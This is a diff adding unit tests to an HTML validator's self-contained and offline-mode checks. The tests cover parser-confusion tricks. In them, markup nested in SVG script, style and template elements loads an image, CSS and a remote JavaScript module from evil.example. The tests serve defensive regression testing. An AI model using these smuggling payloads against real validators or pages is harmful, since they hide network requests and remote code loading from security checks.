@@ -43,6 +43,21 @@ class NewCheckTests(unittest.TestCase):
         self.assertTrue(any("self-contained guarantee" in e and "evil.example" in e
                             for e in errors), errors)
 
+    def test_a_resource_hidden_inside_a_foreign_script_or_style_still_errors(self):
+        # CMH-VAL-21: NOTHING is raw text inside foreign content. HTML5 takes a `<script>` /
+        # `<style>` start tag in the SVG namespace through "any other start tag", which inserts a
+        # foreign element and leaves the tokenizer in the DATA state - so this `<img>` is a real
+        # element a browser builds (`img` breaks out of foreign content and is inserted in the
+        # HTML namespace) and FETCHES, as Chromium confirms. Reading the body as raw text left it
+        # out of both lookups this check reads, so the document passed the self-contained
+        # guarantee while still making a network request.
+        for elem in ("script", "style"):
+            with self.subTest(elem=elem):
+                smuggled = ('<svg><%s><img src="//evil.example/x.png"></%s></svg>'
+                            % (elem, elem))
+                errors, _ = self._errs_warns(build(body=self._body(MAIN, smuggled)))
+                self.assertTrue(any("evil.example" in e for e in errors), errors)
+
     def test_chartjs_cdn_script_is_exempt_from_self_contained_error(self):
         script = '<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>'
         errors, _ = self._errs_warns(build(body=self._body(MAIN, script)))
@@ -551,6 +566,26 @@ class NewCheckTests(unittest.TestCase):
                 nested = "<template id=\"outer\"><template id=\"inner\">\n%s\n</template></template>" % inner
                 errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, nested))))
                 self.assertTrue(any(needle in e for e in errors), ("nested", inner, errors))
+
+    def test_offline_egress_check_sees_a_script_nested_in_a_template_parked_script(self):
+        # CMH-VAL-21: inside a template a `<svg><script>` holds MARKUP too, so a SECOND script
+        # nested in an inert one is a real element the exporter's recursive walk carries - with
+        # its OWN attributes. While the parked capture was one scalar opened only when empty,
+        # only the outer `text/plain` record reached `template_scripts` and the inner
+        # EXECUTABLE script's import was skipped, recreating the validator/exporter mismatch the
+        # template scan exists to close.
+        block = ('<template id="parked"><svg><script type="text/plain">'
+                 '<script type="text/javascript">import("https://evil.example/x.js");</script>'
+                 "</script></svg></template>")
+        errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, block))))
+        self.assertTrue(any("imports a network module" in e for e in errors), errors)
+
+    def test_offline_check_sees_a_style_nested_in_a_template_parked_style(self):
+        block = ('<template id="parked-css"><svg><style>'
+                 "<style>.x { background-image: url(https://evil.example/bg.png); }</style>"
+                 "</style></svg></template>")
+        errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, block))))
+        self.assertTrue(any("offline mode" in e and "url(" in e for e in errors), errors)
 
     def test_offline_check_sees_template_parked_network_css(self):
         block = ('<template id="parked-css">\n'
